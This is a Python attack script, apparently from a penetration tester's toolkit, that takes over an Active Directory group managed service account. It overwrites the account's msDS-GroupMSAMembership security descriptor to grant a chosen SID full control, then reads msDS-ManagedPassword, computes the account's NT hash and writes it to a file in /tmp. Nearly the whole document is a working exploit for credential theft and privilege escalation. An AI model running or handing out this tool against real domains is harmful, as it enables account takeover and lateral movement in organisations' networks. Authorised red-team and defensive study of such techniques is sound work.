#!/usr/bin/env python3
"""
gmsa_takeover.py — Flip msDS-GroupMSAMembership on a gMSA you have write on,
then read msDS-ManagedPassword and print the NT hash.

Use when BloodHound shows you (or a principal whose ccache you hold) have
GenericWrite / GenericAll / WriteDACL on a gMSA target.

Usage:
  # Kerberos (needs valid KRB5CCNAME ticket + krb5.conf + kinit'd)
  python3 gmsa_takeover.py --dc dc01.example.com --gmsa-dn "CN=svc_gmsa,CN=Managed Service Accounts,DC=example,DC=com" --principal-sid S-1-5-21-...-1104 --kerberos

  # NTLM (if attacker principal NOT in Protected Users)
  python3 gmsa_takeover.py --dc dc01.example.com --gmsa-dn "..." --principal-sid ... --user alice --password 'Pass123' --domain example.com

Output: NT hash on stdout, also saved to /tmp/<sam>_nt.txt
"""
import argparse
import hashlib
import struct
import sys
import os


def build_sd(sid_str: str) -> bytes:
    """Build a self-relative SD granting FullControl to sid_str only.
    Layout: Rev+Control+OwnerOff+GroupOff+SaclOff+DaclOff + OwnerSID + GroupSID + DACL(1 ACE)
    """
    from impacket.ldap.ldaptypes import LDAP_SID
    sid = LDAP_SID()
    sid.fromCanonical(sid_str)
    sb = sid.getData()

    mask = struct.pack("<I", 0x000F01FF)  # FullControl
    ace_body = mask + sb
    ace = b"\x00\x00" + struct.pack("<H", 4 + len(ace_body)) + ace_body
    acl = (b"\x04\x00"
           + struct.pack("<H", 8 + len(ace))
           + struct.pack("<H", 1)
           + struct.pack("<H", 0)
           + ace)
    hlen = 20
    sd = (b"\x01\x00"
          + struct.pack("<H", 0x8004)                          # SE_DACL_PRESENT|SE_SELF_RELATIVE
          + struct.pack("<I", hlen)                            # OwnerOff
          + struct.pack("<I", hlen + len(sb))                  # GroupOff
          + struct.pack("<I", 0)                               # SaclOff
          + struct.pack("<I", hlen + 2 * len(sb))              # DaclOff
          + sb + sb + acl)
    return sd


def parse_managed_pw_blob(blob: bytes) -> str:
    """MSDS-MANAGEDPASSWORD_BLOB -> MD4 of current pw (UTF-16LE bytes) = NT hash."""
    cur_off = struct.unpack("<H", blob[8:10])[0]
    prev_off = struct.unpack("<H", blob[10:12])[0]
    query_off = struct.unpack("<H", blob[12:14])[0]
    end = prev_off if prev_off else query_off
    cur_pw = blob[cur_off:end]
    return hashlib.new("md4", cur_pw).hexdigest()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--dc", required=True, help="DC hostname (FQDN preferred)")
    ap.add_argument("--gmsa-dn", required=True, help="Full DN of gMSA object")
    ap.add_argument("--principal-sid", required=True,
                    help="SID you'll grant read-pw rights to (usually your own)")
    ap.add_argument("--kerberos", action="store_true",
                    help="Bind via SASL/Kerberos (uses $KRB5CCNAME)")
    ap.add_argument("--user", help="NTLM username (if not --kerberos)")
    ap.add_argument("--password", help="NTLM password")
    ap.add_argument("--domain", help="AD domain (NTLM mode)")
    ap.add_argument("--port", type=int, default=389, help="LDAP port (389 plain, 636 LDAPS)")
    ap.add_argument("--tls", action="store_true", help="Use LDAPS on port 636")
    args = ap.parse_args()

    from ldap3 import Server, Connection, ALL, SASL, KERBEROS, NTLM, MODIFY_REPLACE, Tls
    import ssl

    if args.tls:
        tls = Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
        srv = Server(args.dc, port=636, use_ssl=True, tls=tls, get_info=ALL, connect_timeout=20)
    else:
        srv = Server(args.dc, port=args.port, get_info=ALL, connect_timeout=20)

    if args.kerberos:
        if "KRB5CCNAME" not in os.environ:
            print("[-] KRB5CCNAME not set — did you kinit?", file=sys.stderr)
            sys.exit(2)
        c = Connection(srv, authentication=SASL, sasl_mechanism=KERBEROS,
                       receive_timeout=20)
    else:
        if not (args.user and args.password and args.domain):
            print("[-] NTLM mode needs --user --password --domain", file=sys.stderr)
            sys.exit(2)
        c = Connection(srv, user=f"{args.domain}\\{args.user}", password=args.password,
                       authentication=NTLM, receive_timeout=20)

    if not c.bind():
        print(f"[-] bind failed: {c.result}", file=sys.stderr)
        sys.exit(3)
    print(f"[+] bound as {c.extend.standard.who_am_i()}")

    sd = build_sd(args.principal_sid)
    print(f"[+] writing SD ({len(sd)} B) to msDS-GroupMSAMembership of {args.gmsa_dn}")
    c.modify(args.gmsa_dn,
             {"msDS-GroupMSAMembership": [(MODIFY_REPLACE, [sd])]})
    if c.result.get("result") != 0:
        print(f"[-] modify failed: {c.result}", file=sys.stderr)
        sys.exit(4)
    print("[+] modify OK")

    # Some DCs cache ACL — reconnect for fresh effective access
    c.unbind()
    if args.kerberos:
        c = Connection(srv, authentication=SASL, sasl_mechanism=KERBEROS, receive_timeout=20)
    else:
        c = Connection(srv, user=f"{args.domain}\\{args.user}", password=args.password,
                       authentication=NTLM, receive_timeout=20)
    c.bind()

    print("[+] reading msDS-ManagedPassword ...")
    c.search(args.gmsa_dn, "(objectClass=*)", attributes=["msDS-ManagedPassword", "sAMAccountName"])
    if not c.entries:
        print("[-] gMSA not found after rebind", file=sys.stderr)
        sys.exit(5)
    e = c.entries[0]
    raw = e["msDS-ManagedPassword"].raw_values
    if not (raw and raw[0]):
        print("[-] msDS-ManagedPassword still empty — our SD write may not have taken effect",
              file=sys.stderr)
        sys.exit(6)
    nt = parse_managed_pw_blob(raw[0])
    sam = str(e["sAMAccountName"])
    print(f"[+] {sam} NT hash = {nt}")
    out = f"/tmp/{sam.rstrip('$').lower()}_nt.txt"
    open(out, "w").write(nt + "\n")
    print(f"[+] saved to {out}")
    c.unbind()


if __name__ == "__main__":
    main()
